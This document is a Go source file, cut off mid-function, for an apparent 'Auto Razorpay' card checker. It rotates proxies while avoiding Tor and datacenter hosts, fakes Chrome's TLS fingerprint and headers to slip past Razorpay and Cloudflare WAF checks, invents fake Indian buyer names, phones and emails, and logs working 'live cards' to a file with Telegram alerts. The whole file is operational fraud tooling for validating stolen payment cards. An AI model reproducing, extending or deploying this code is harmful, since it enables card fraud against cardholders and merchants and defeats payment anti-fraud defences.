package main

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"context"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	// uTLS lets us mimic Chrome's TLS fingerprint (JA3) so Razorpay/Cloudflare
	// can't detect us as a Go HTTP client. Without this, every request gets a
	// different/smaller response (WAF throttling) and payment_risk_check_failed.
	utls "github.com/refraction-networking/utls"
)

// ────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
//  Modified for Railway.app + sites.txt support + WAF Bypass v4 (DEEP FIXED)
// ────────────────────────────────────────────────────────────────────────

const (
	// Updated BUILD hashes — fetched from checkout.razorpay.com/v1/checkout.js
	// BUILD = COMMIT_HASH (g var in checkout.js). Updated 2025-07-14 — old hash was WAF-rejected.
	// BUILD_V1 unchanged (still matches bundle).
	BUILD    = "309175090e8afce78fc5e908a94a10676ce15aa5"
	BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
	PORT     = 7070
)

// parsedProxy holds the raw string + pre-parsed *url.URL
type parsedProxy struct {
	raw    string
	parsed *url.URL
}

var (
	razorpayURLs []string
	urlIndex     uint64
	proxyIndex   uint64

	globalProxyList []parsedProxy

	// High-load protection
	maxConcurrentChecks = 120
	checkSemaphore      = make(chan struct{}, maxConcurrentChecks)

	// 2026-07-16: shuttingDown is set to 1 by the shutdown handler before
	// closing liveWriteChan / tgNotifyChan. logLive() and notifyHitAsync()
	// check this flag and become no-ops during shutdown, so they never
	// send on a closed channel (which would panic the handler goroutine).
	shuttingDown atomic.Bool

	// Safe concurrent writes to live.txt
	liveLogMutex sync.Mutex

	// Path to the live-cards log file. Settable via LIVE_FILE env var so
	// deployments can point it at a mounted volume without recompiling.
	liveFilePath = "live.txt"

	// ── Dead proxy tracker (CRITICAL fix #1) ────────────────────────────
	// When a proxy is classified as DEAD (quota exhausted, auth failed,
	// connection refused, etc.) we mark it here with an expiry time.
	// getNextProxy skips proxies that are still "dead". After the TTL
	// expires, the proxy is automatically retried (in case it was a
	// transient issue like a temporary quota reset).
	deadProxyMutex   sync.Mutex
	deadProxies      = make(map[string]time.Time) // proxy.raw -> expiry time
	deadProxyTTL     = 3 * time.Minute            // how long to skip a dead proxy (shortened to avoid over-blocking)
	deadProxySweepAt time.Time                    // last time we pruned the map

	// ── Per-proxy HTTP transport cache (CRITICAL fix #2) ────────────────
	// Reusing transports across checkCard calls enables TCP connection
	// reuse, TLS session resumption, and eliminates FD churn.
	proxyClientMutex sync.Mutex
	proxyClientCache = make(map[string]*http.Transport) // proxy.raw -> *http.Transport

	// ── Shared HTTP client for non-proxy calls (exchange rates, Telegram) ──
	sharedHTTPClient = &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        20,
			MaxIdleConnsPerHost: 5,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}

	// ── Async live.txt writer (MEDIUM fix #9) ───────────────────────────
	// Instead of opening/writing/closing live.txt on every hit under a
	// global mutex, we send lines to a buffered channel and a background
	// goroutine writes them in batches.
	liveWriteChan = make(chan string, 500)
)

func getNextURL() string {
	if len(razorpayURLs) == 0 {
		return "https://pages.razorpay.com/lckuk-international"
	}
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

const proxyScheme = "http"

func formatProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	parts := strings.Split(raw, ":")
	if len(parts) == 4 {
		host := parts[0]
		port := parts[1]
		user := url.QueryEscape(parts[2])
		pass := url.QueryEscape(parts[3])
		return fmt.Sprintf("%s://%s:%s@%s:%s", proxyScheme, user, pass, host, port)
	}
	return proxyScheme + "://" + raw
}

// loadProxies reads the proxy file and returns parsed entries.
// Errors are logged but not propagated: a missing/empty px.txt simply means
// "no proxies" (DIRECT mode), which is a legitimate operating mode.
func loadProxies(filepath string) []parsedProxy {
	var proxies []parsedProxy
	data, err := os.ReadFile(filepath)
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("loadProxies: failed to read %s: %v", filepath, err)
		}
		return proxies
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		formatted := formatProxy(line)
		if formatted == "" {
			continue
		}
		pURL, err := url.Parse(formatted)
		if err != nil {
			log.Printf("loadProxies: skipping invalid proxy %q: %v", line, err)
			continue
		}
		proxies = append(proxies, parsedProxy{raw: formatted, parsed: pURL})
	}
	return proxies
}

// extractProxyHost extracts the bare hostname from a proxy URL string.
// Order matters: strip credentials first, then scheme, then port, so that
// `http://user:pass@host:8080` reliably becomes `host`.
func extractProxyHost(raw string) string {
	host := raw

	// Strip credentials (everything before '@') FIRST — a password may
	// legitimately contain ':' or '//' sequences that would otherwise
	// confuse the scheme/port detection below.
	if idx := strings.LastIndex(host, "@"); idx != -1 {
		host = host[idx+1:]
	}

	// Remove scheme
	if idx := strings.Index(host, "://"); idx != -1 {
		host = host[idx+3:]
	}

	// Remove port (only if a host remains)
	if idx := strings.Index(host, ":"); idx != -1 {
		host = host[:idx]
	}

	// Remove any leftover path/query
	if idx := strings.IndexAny(host, "/?"); idx != -1 {
		host = host[:idx]
	}

	return strings.ToLower(strings.TrimSpace(host))
}

// torOrBadHosts lists substrings that strongly indicate the proxy is on a
// known Tor / datacenter / VPN host. Substring matching is intentional so
// `pl-tor.pvdata.host`, `tor-exit.anonymizer.com`, etc. are all caught.
//
// Keep the entries narrow — bare substrings like "aws" or "vps" would
// false-positive on legitimate residential hostnames that happen to contain
// those letters, so we keep them anchored with separators where needed.
var torOrBadHosts = []string{
	"tor", "pl-tor", "exit", "relay",
	"datacenter", ".aws", "azure", "gcp",
	"linode", "digitalocean", "vultr",
	"hetzner", "ovh", "contabo", "vps",
	"proxy", "vpn", "res-", "res.",
	"socks", "tunnel", "anonym",
}

func isBadProxyHost(raw string) bool {
	host := extractProxyHost(raw)
	if host == "" {
		return true
	}
	for _, bad := range torOrBadHosts {
		if strings.Contains(host, bad) {
			return true
		}
	}
	return false
}

// getNextProxy returns a pointer to a proxy from the shared list, skipping
// markProxyDead records a proxy as dead with a TTL. getNextProxy will skip
// it until the TTL expires. This is the CRITICAL fix for progressive slowdown
// caused by dead proxies (quota exhausted, auth failed, etc.) accumulating
// in the rotation.
func markProxyDead(proxyRaw string) {
	if proxyRaw == "" {
		return
	}
	deadProxyMutex.Lock()
	deadProxies[proxyRaw] = time.Now().Add(deadProxyTTL)
	// Periodic sweep: prune expired entries every 5 minutes to prevent
	// the map from growing unboundedly.
	if time.Since(deadProxySweepAt) > 5*time.Minute {
		now := time.Now()
		for k, v := range deadProxies {
			if now.After(v) {
				delete(deadProxies, k)
			}
		}
		deadProxySweepAt = now
	}
	deadProxyMutex.Unlock()
}

// isProxyDead checks if a proxy is currently marked as dead.
func isProxyDead(proxyRaw string) bool {
	if proxyRaw == "" {
		return false
	}
	deadProxyMutex.Lock()
	expiry, ok := deadProxies[proxyRaw]
	deadProxyMutex.Unlock()
	if !ok {
		return false
	}
	if time.Now().After(expiry) {
		// TTL expired — allow it again
		deadProxyMutex.Lock()
		delete(deadProxies, proxyRaw)
		deadProxyMutex.Unlock()
		return false
	}
	return true
}

// getProxyTransport returns a cached *http.Transport for the given proxy URL.
// Reusing transports across checkCard calls enables TCP connection reuse,
// TLS session resumption, and eliminates FD churn (CRITICAL fix #2).
// The transport is safe for concurrent use — each caller creates its own
// http.Client wrapping this shared transport + a fresh cookie jar.
func getProxyTransport(proxyParsedURL *url.URL, proxyRaw string) *http.Transport {
	cacheKey := proxyRaw // "" for direct (no proxy)

	proxyClientMutex.Lock()
	defer proxyClientMutex.Unlock()
	if t, ok := proxyClientCache[cacheKey]; ok {
		return t
	}

	// Create new transport
	transport := &http.Transport{
		MaxIdleConns:          200,
		MaxIdleConnsPerHost:   50,
		MaxConnsPerHost:       100,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		Proxy:                 http.ProxyFromEnvironment,
	}
	if proxyParsedURL != nil {
		transport.Proxy = http.ProxyURL(proxyParsedURL)
	}
	proxyClientCache[cacheKey] = transport
	return transport
}

// getNextProxy returns a pointer to a proxy from the shared list, skipping
// hosts that look like Tor / datacenter / VPN endpoints AND proxies that
// have been marked dead recently (CRITICAL fix #1).
//
// IMPORTANT: callers must NOT keep a pointer to the slice element across
// goroutines — we return a *copy* of the parsedProxy struct so each caller
// owns its own value and there is no shared mutable state.
func getNextProxy(proxyList []parsedProxy) *parsedProxy {
	if len(proxyList) == 0 {
		return nil
	}

	// Scan at most 2× len(proxyList) entries to find a non-dead, non-bad-host proxy.
	maxAttempts := len(proxyList) * 2

	for attempt := 0; attempt < maxAttempts; attempt++ {
		idx := atomic.AddUint64(&proxyIndex, 1) - 1
		p := proxyList[idx%uint64(len(proxyList))]
		if isBadProxyHost(p.raw) {
			continue
		}
		if isProxyDead(p.raw) {
			continue
		}
		return &p
	}

	// All proxies are either bad-host or dead — fall back to any proxy
	// (better to try than to return nil)
	log.Printf("WARNING: all proxies are dead/bad-host; falling back to a random proxy")
	idx := atomic.AddUint64(&proxyIndex, 1) - 1
	p := proxyList[idx%uint64(len(proxyList))]
	return &p
}

func loadSites(filepath string) []string {
	var sites []string
	data, err := os.ReadFile(filepath)
	if err != nil {
		return sites
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "https://") {
			sites = append(sites, line)
		}
	}
	return sites
}

// randInt returns a uniformly random integer in the inclusive range [min, max].
// If the crypto/rand source fails (extremely unlikely) the function falls back
// to min so the caller still gets a value in range rather than panicking.
func randInt(min, max int) int {
	if max < min {
		min, max = max, min
	}
	span := int64(max - min + 1)
	if span <= 0 {
		return min
	}
	n, err := rand.Int(rand.Reader, big.NewInt(span))
	if err != nil {
		return min
	}
	return int(n.Int64()) + min
}

// genUA returns a random Chrome User-Agent string. checkCard uses this to
// generate a UA, then passes it to NewCustomFetch which derives a MATCHING
// Sec-CH-UA from the same Chrome major (see parseChromeMajor).
func genUA() string {
	major := randInt(135, 150)
	build := randInt(5000, 6999)
	patch := randInt(50, 249)
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

// genSecChUA is retained for any future caller that needs a standalone
// Sec-CH-UA string. The main flow uses CustomFetch.secChUA instead, which is
// derived from the same Chrome major as the User-Agent.
func genSecChUA() string {
	major := randInt(135, 150)
	var gb string
	switch major % 3 {
	case 0:
		gb = "Not_A Brand"
	case 1:
		gb = "Not.A/Brand"
	default:
		gb = "Not;A Brand"
	}
	return fmt.Sprintf(`"%s";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, gb, major, major)
}

var _ = genSecChUA // retained for future standalone use

func genIndianPhone() string {
	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
	rest := ""
	for i := 0; i < 9; i++ {
		rest += strconv.Itoa(randInt(0, 9))
	}
	return "+91" + first + rest
}

func genEmail() string {
	names := []string{"alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna", "raj", "priya", "vikram", "ananya", "rohit", "neha"}
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"}
	return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@" + domains[randInt(0, len(domains)-1)]
}

func genName() string {
	names := []string{"Alex Kumar", "John Sharma", "Mike Patel", "Sara Gupta", "David Singh", "Emma Reddy", "James Nair", "Lisa Iyer", "Chris Rao", "Anna Mehta", "Raj Verma", "Priya Joshi", "Vikram Desai", "Ananya Nair", "Rohit Singh", "Neha Kapoor"}
	return names[randInt(0, len(names)-1)]
}

func getBrand(cc string) string {
	if strings.HasPrefix(cc, "4") {
		return "visa"
	}
	if len(cc) >= 2 {
		switch cc[:2] {
		case "51", "52", "53", "54", "55":
			return "mastercard"
		case "34", "37":
			return "amex"
		}
	}
	if strings.HasPrefix(cc, "6011") || strings.HasPrefix(cc, "65") {
		return "discover"
	}
	return "unknown"
}

func findBetween(content, start, end string) string {
	si := strings.Index(content, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(content[si:], end)
	if ei == -1 {
		return ""
	}
	return content[si : si+ei]
}

func extractJSONVar(content, varName string) string {
	prefix := "var " + varName + " ="
	startIdx := strings.Index(content, prefix)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(prefix)

	for startIdx < len(content) {
		c := content[startIdx]
		if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
			break
		}
		startIdx++
	}

	if startIdx >= len(content) || content[startIdx] != '{' {
		return ""
	}

	depth := 0
	inString := false
	escaped := false

	for i := startIdx; i < len(content); i++ {
		c := content[i]

		if escaped {
			escaped = false
			continue
		}
		if c == '\\' && inString {
			escaped = true
			continue
		}
		if c == '"' {
			inString = !inString
			continue
		}
		if inString {
			continue
		}
		if c == '{' {
			depth++
		} else if c == '}' {
			depth--
			if depth == 0 {
				return content[startIdx : i+1]
			}
		}
	}
	return ""
}

func generateRzpDeviceID() (string, string) {
	buf := make([]byte, 16)
	// crypto/rand.Read can return an error; on Linux it almost never does,
	// but ignoring it would let a zeroed buffer produce a deterministic
	// device ID. Fall back to time-seeded randomness instead.
	if _, err := rand.Read(buf); err != nil {
		for i := range buf {
			buf[i] = byte(randInt(0, 255))
		}
	}
	h := sha1.Sum(buf)
	hStr := hex.EncodeToString(h[:])
	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
	rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
	return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 14)
	for i := 0; i < 14; i++ {
		n, err := rand.Int(rand.Reader, big.NewInt(62))
		if err != nil {
			n = big.NewInt(int64(randInt(0, 61)))
		}
		buf[i] = base62[n.Int64()]
	}
	return string(buf)
}

// FIX 4: Shuffle form values for realistic submission
func shuffleFormValues(v url.Values) url.Values {
	type kv struct {
		key   string
		value []string
	}
	var items []kv
	for k := range v {
		items = append(items, kv{k, v[k]})
	}

	// Fisher-Yates shuffle
	for i := len(items) - 1; i > 0; i-- {
		j := randInt(0, i)
		items[i], items[j] = items[j], items[i]
	}

	result := url.Values{}
	for _, item := range items {
		result[item.key] = item.value
	}
	return result
}

// resolveRazorpayInitData handles both page types:
//  1. pages.razorpay.com  — classic static page with "var data = {...}"
//  2. razorpay.me/@slug   — redirects to payment_link; fetch data via API
func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw string) (map[string]interface{}, string, error) {
	// For razorpay.me URLs we need to follow the redirect and then call the API
	isRzpMe := strings.Contains(targetURL, "razorpay.me/")

	if isRzpMe {
		// Step A: Follow redirect to get final URL (may redirect to pages.razorpay.com or stay at razorpay.me)
		resp, err := fetch.Get(targetURL, map[string]string{
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language":           generateAcceptLanguage(),
			"Sec-Fetch-Dest":            "document",
			"Sec-Fetch-Mode":            "navigate",
			"Sec-Fetch-Site":            "none",
			"Sec-Fetch-User":            "?1",
			"Upgrade-Insecure-Requests": "1",
		})
		if err != nil {
			// Distinguish between a real proxy/network error and
			// an HTTP-status error that Go wrapped into *url.Error
			// (e.g. paid proxy returning 402 "Payment Required"
			// when the user's quota is exhausted).
			if code := extractHTTPStatusFromErr(err.Error()); code > 0 {
				desc, proxyStatus := classifyHTTPError(code)
				return nil, proxyStatus, fmt.Errorf("%s: %v", desc, err)
			}
			return nil, "", err
		}
		// Handle ALL non-2xx responses, not just 403/429. Razorpay
		// can return:
		//   402 — payment link expired / inactive
		//   404 — payment link not found
		//   5xx — Razorpay server error
		// and the proxy itself can return 402/407/5xx.
		if resp.StatusCode == 403 || resp.StatusCode == 429 {
			return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
		}
		if resp.StatusCode == 402 {
			// Could be the proxy (quota exhausted) OR Razorpay
			// (link expired). Since the proxy is the more common
			// culprit, classify as DEAD.
			return nil, "DEAD", fmt.Errorf("HTTP 402 Payment Required on page load (proxy quota exhausted or link expired)")
		}
		if resp.StatusCode == 404 {
			return nil, "LIVE", fmt.Errorf("Payment link not found (HTTP 404) — link may be deleted or never existed")
		}
		if resp.StatusCode == 407 {
			return nil, "DEAD", fmt.Errorf("Proxy authentication failed (HTTP 407)")
		}
		if resp.StatusCode >= 500 {
			return nil, "LIVE", fmt.Errorf("Razorpay server error on page load (HTTP %d) — try again later", resp.StatusCode)
		}

		pageHTML := resp.Text()
		finalURL := targetURL

		// Try to get the final URL from page content (Location or canonical)
		if loc := findBetween(pageHTML, `<link rel="canonical" href="`, `"`); loc != "" {
			finalURL = loc
		}

		// Try extracting slug — razorpay.me/@slug or razorpay.me/slug
		slug := ""
		if idx := strings.Index(targetURL, "razorpay.me/"); idx != -1 {
			rest := targetURL[idx+len("razorpay.me/"):]
			rest = strings.TrimPrefix(rest, "@")
			rest = strings.Split(rest, "?")[0]
			rest = strings.Split(rest, "#")[0]
			slug = strings.TrimSpace(rest)
		}

		// Strategy A: try fetching init data from Razorpay's internal page-data API
		if slug != "" {
			apiURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s?expand[]=payment_page_items", slug)
			apiResp, apiErr := fetch.Get(apiURL, map[string]string{
				"Accept":         "application/json, text/plain, */*",
				"Origin":         "https://razorpay.me",
				"Referer":        targetURL,
				"Sec-Fetch-Dest": "empty",
				"Sec-Fetch-Mode": "cors",
				"Sec-Fetch-Site": "cross-site",
			})
			if apiErr == nil && apiResp.StatusCode == 200 {
				var apiData map[string]interface{}
				if json.Unmarshal([]byte(apiResp.Text()), &apiData) == nil {
					if _, hasID := apiData["id"]; hasID {
						// Build initData compatible with the rest of the flow
						initData := buildInitDataFromLinkAPI(apiData, pageHTML)
						if initData != nil {
							return initData, finalURL, nil
						}
					}
				}
			}
		}

		// Strategy B: try extracting from HTML (some razorpay.me pages do SSR)
		pageData := tryExtractFromHTML(pageHTML)
		if pageData != nil {
			return pageData, finalURL, nil
		}

		return nil, "", fmt.Errorf("Could not extract Razorpay data from razorpay.me page (slug: %s)", slug)
	}

	// Standard pages.razorpay.com flow
	resp, err := fetch.Get(targetURL, map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":           generateAcceptLanguage(),
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Upgrade-Insecure-Requests": "1",
	})
	if err != nil {
		if code := extractHTTPStatusFromErr(err.Error()); code > 0 {
			desc, proxyStatus := classifyHTTPError(code)
			return nil, proxyStatus, fmt.Errorf("%s: %v", desc, err)
		}
		return nil, "", err
	}
	if resp.StatusCode == 403 || resp.StatusCode == 429 || strings.Contains(resp.Text(), "Forbidden") {
		return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
	}
	if resp.StatusCode == 402 {
		return nil, "DEAD", fmt.Errorf("HTTP 402 Payment Required on page load (proxy quota exhausted or link expired)")
	}
	if resp.StatusCode == 404 {
		return nil, "LIVE", fmt.Errorf("Payment page not found (HTTP 404)")
	}
	if resp.StatusCode == 407 {
		return nil, "DEAD", fmt.Errorf("Proxy authentication failed (HTTP 407)")
	}
	if resp.StatusCode >= 500 {
		return nil, "LIVE", fmt.Errorf("Razorpay server error on page load (HTTP %d) — try again later", resp.StatusCode)
	}

	pageHTML := resp.Text()
	pageData := tryExtractFromHTML(pageHTML)
	if pageData != nil {
		return pageData, targetURL, nil
	}

	return nil, "", fmt.Errorf("Failed to locate Razorpay data on page")
}

// tryExtractFromHTML tries multiple patterns to find init data in HTML
func tryExtractFromHTML(html string) map[string]interface{} {
	patterns := []string{"data", "__INITIAL_DATA__", "__rzp_config__", "rzpConfig", "pageConfig", "checkoutData", "initialData", "__INITIAL_STATE__", "window.__data__", "rzpData", "checkoutPageConfig"}
	for _, varName := range patterns {
		jsonStr := extractJSONVar(html, varName)
		if jsonStr == "" {
			continue
		}
		var m map[string]interface{}
		if json.Unmarshal([]byte(jsonStr), &m) == nil && len(m) > 2 {
			return m
		}
		// Try double-encoded
		var inner string
		if json.Unmarshal([]byte(jsonStr), &inner) == nil {
			if json.Unmarshal([]byte(inner), &m) == nil && len(m) > 2 {
				return m
			}
		}
	}

	// Try meta tag: <meta name="rzp-data" content="{...}">
	if idx := strings.Index(html, `name="rzp-data"`); idx != -1 {
		sub := html[idx:]
		content := findBetween(sub, `content='`, `'`)
		if content == "" {
			content = findBetween(sub, `content="`, `"`)
		}
		if content != "" {
			var m map[string]interface{}
			if json.Unmarshal([]byte(content), &m) == nil {
				return m
			}
		}
	}

	// Try script tag with application/json
	scriptStart := `<script type="application/json"`
	if idx := strings.Index(html, scriptStart); idx != -1 {
		inner := html[idx:]
		jsonContent := findBetween(inner, ">", "</script>")
		if jsonContent != "" {
			var m map[string]interface{}
			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &m) == nil && len(m) > 2 {
				return m
			}
		}
	}

	// Try __NEXT_DATA__ (Next.js pages)
	if idx := strings.Index(html, `id="__NEXT_DATA__"`); idx != -1 {
		inner := html[idx:]
		jsonContent := findBetween(inner, ">", "</script>")
		if jsonContent != "" {
			var nextData map[string]interface{}
			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &nextData) == nil {
				if props, ok := nextData["props"].(map[string]interface{}); ok {
					if initialProps, ok := props["initialProps"].(map[string]interface{}); ok {
						return initialProps
					}
				}
				return nextData
			}
		}
	}

	return nil
}

// buildInitDataFromLinkAPI converts Razorpay payment_links API response
// into the initData format the rest of the flow expects
func buildInitDataFromLinkAPI(apiData map[string]interface{}, pageHTML string) map[string]interface{} {
	linkID := getStringFromMap(apiData, "id") // ppl_xxx or pl_xxx
	if linkID == "" {
		return nil
	}

	// Extract key_id from page HTML (it's usually in a script tag on razorpay.me pages)
	keyID := ""
	for _, pat := range []string{`key_id":"`, `key":"`, `"key_id": "`, `"key": "`} {
		if idx := strings.Index(pageHTML, pat); idx != -1 {
			start := idx + len(pat)
			end := strings.Index(pageHTML[start:], `"`)
			if end > 0 && end < 50 {
				candidate := pageHTML[start : start+end]
				if strings.HasPrefix(candidate, "rzp_") {
					keyID = candidate
					break
				}
			}
		}
	}

	// Build payment_link sub-object
	plObj := map[string]interface{}{
		"id": linkID,
	}

	// Extract payment_page_items if present
	if items, ok := apiData["payment_page_items"].([]interface{}); ok && len(items) > 0 {
		plObj["payment_page_items"] = items
	} else if items, ok := apiData["items"].([]interface{}); ok && len(items) > 0 {
		plObj["payment_page_items"] = items
	}

	initData := map[string]interface{}{
		"key_id":       keyID,
		"key":          keyID,
		"payment_link": plObj,
	}

	// Copy keyless_header if present
	if kh := getStringFromMap(apiData, "keyless_header"); kh != "" {
		initData["keyless_header"] = kh
	}

	return initData
}

func generateAcceptLanguage() string {
	langs := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-IN,en;q=0.9,hi;q=0.8",
		"en-US,en;q=0.9,hi;q=0.8",
	}
	return langs[randInt(0, len(langs)-1)]
}

// ─── Currency conversion ───────────────────────────────────────────────────
// When a user selects a currency (e.g. USD) but the Razorpay payment link is
// locked to a different currency (e.g. INR), we convert the user's amount to
// the site's currency at the current exchange rate before charging.
//
// Uses the free Frankfurter API (no key required, based on ECB rates).
// Results are cached for 1 hour to minimize API calls.

var (
	exchangeRateCache      = make(map[string]float64) // "FROM_TO" -> rate
	exchangeRateCacheTimes = make(map[string]time.Time)
	exchangeRateFailCache  = make(map[string]time.Time) // MEDIUM fix #10: negative cache
	exchangeRateCacheMutex sync.Mutex
)

// getExchangeRate returns the exchange rate from `from` currency to `to` currency.
// E.g. getExchangeRate("USD", "INR") might return 83.12 (1 USD = 83.12 INR).
// Results are cached for 1 hour. Returns an error if both APIs fail.
//
// Uses TWO free APIs (no key required) for maximum reliability:
//  1. Frankfurter (ECB rates) — https://api.frankfurter.dev/v1/latest
//     Supports ~30 major currencies but NOT AED, BHD, etc.
//  2. ExchangeRate-API — https://api.exchangerate-api.com/v4/latest
//     Supports ALL ~160 world currencies (fallback for AED etc.)
func getExchangeRate(from, to string) (float64, error) {
	from = strings.ToUpper(strings.TrimSpace(from))
	to = strings.ToUpper(strings.TrimSpace(to))

	if from == to {
		return 1.0, nil
	}
	if from == "" || to == "" {
		return 0, fmt.Errorf("empty currency code")
	}

	cacheKey := from + "_" + to

	exchangeRateCacheMutex.Lock()
	if rate, ok := exchangeRateCache[cacheKey]; ok {
		if cacheTime, ctOk := exchangeRateCacheTimes[cacheKey]; ctOk && time.Since(cacheTime) < time.Hour {
			exchangeRateCacheMutex.Unlock()
			return rate, nil
		}
	}
	// MEDIUM fix #10: negative cache — if this key failed recently (within
	// 60s), return the error immediately without hitting the APIs again.
	// This prevents 20s of latency cascading through every request when
	// upstream APIs are down.
	if failTime, ftOk := exchangeRateFailCache[cacheKey]; ftOk && time.Since(failTime) < 60*time.Second {
		exchangeRateCacheMutex.Unlock()
		return 0, fmt.Errorf("exchange rate for %s→%s recently failed (negative cache)", from, to)
	}
	exchangeRateCacheMutex.Unlock()

	// MEDIUM fix #12: use shared HTTP client instead of creating a new one
	client := sharedHTTPClient

	// ── API 1: Frankfurter (new URL — old api.frankfurter.app redirects here) ──
	// Returns: {"amount":1.0,"base":"USD","date":"2026-07-03","rates":{"INR":83.12}}
	frankfurterURL := fmt.Sprintf("https://api.frankfurter.dev/v1/latest?from=%s&to=%s", from, to)
	if resp, err := client.Get(frankfurterURL); err == nil {
		rate, ferr := parseFrankfurterResponse(resp, to)
		resp.Body.Close()
		if ferr == nil && rate > 0 {
			exchangeRateCacheMutex.Lock()
			exchangeRateCache[cacheKey] = rate
			exchangeRateCacheTimes[cacheKey] = time.Now()
			exchangeRateCacheMutex.Unlock()
			log.Printf("[exchange-rate] %s→%s = %.4f (Frankfurter)", from, to, rate)
			return rate, nil
		}
		log.Printf("[exchange-rate] Frankfurter failed for %s→%s: %v — trying fallback", from, to, ferr)
	} else {
		log.Printf("[exchange-rate] Frankfurter request failed for %s→%s: %v — trying fallback", from, to, err)
	}

	// ── API 2: open.er-api.com/v6 (replaces deprecated exchangerate-api.com/v4) ──
	// Free, no API key, ~170 currencies. Response: {"result":"success","base_code":"USD","rates":{...}}
	erV6URL := fmt.Sprintf("https://open.er-api.com/v6/latest/%s", from)
	if resp, err := client.Get(erV6URL); err == nil {
		rate, ferr := parseOpenERAPIv6Response(resp, to)
		resp.Body.Close()
		if ferr == nil && rate > 0 {
			exchangeRateCacheMutex.Lock()
			exchangeRateCache[cacheKey] = rate
			exchangeRateCacheTimes[cacheKey] = time.Now()
			exchangeRateCacheMutex.Unlock()
			log.Printf("[exchange-rate] %s→%s = %.4f (open.er-api.com/v6)", from, to, rate)
			return rate, nil
		}
		log.Printf("[exchange-rate] open.er-api.com/v6 failed for %s→%s: %v — trying legacy v4", from, to, ferr)
	} else {
		log.Printf("[exchange-rate] open.er-api.com/v6 request failed for %s→%s: %v — trying legacy v4", from, to, err)
	}

	// ── API 3: exchangerate-api.com/v4 (legacy fallback — deprecated, still responds) ──
	erAPIURL := fmt.Sprintf("https://api.exchangerate-api.com/v4/latest/%s", from)
	if resp, err := client.Get(erAPIURL); err == nil {
		rate, ferr := parseExchangeRateAPIResponse(resp, to)
		resp.Body.Close()
		if ferr == nil && rate > 0 {
			exchangeRateCacheMutex.Lock()
			exchangeRateCache[cacheKey] = rate
			exchangeRateCacheTimes[cacheKey] = time.Now()
			exchangeRateCacheMutex.Unlock()
			log.Printf("[exchange-rate] %s→%s = %.4f (exchangerate-api v4 legacy)", from, to, rate)
			return rate, nil
		}
		// MEDIUM fix #10: record failure in negative cache
		exchangeRateCacheMutex.Lock()
		exchangeRateFailCache[cacheKey] = time.Now()
		exchangeRateCacheMutex.Unlock()
		return 0, fmt.Errorf("exchange rate fetch failed for %s→%s: all 3 APIs failed (last err: %v)", from, to, ferr)
	}

	// MEDIUM fix #10: record failure in negative cache
	exchangeRateCacheMutex.Lock()
	exchangeRateFailCache[cacheKey] = time.Now()
	exchangeRateCacheMutex.Unlock()
	return 0, fmt.Errorf("exchange rate fetch failed for %s→%s: both APIs unreachable", from, to)
}

// parseFrankfurterResponse parses a Frankfurter API response and extracts
// the rate for the target currency.
func parseFrankfurterResponse(resp *http.Response, to string) (float64, error) {
	if resp.StatusCode != 200 {
		return 0, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
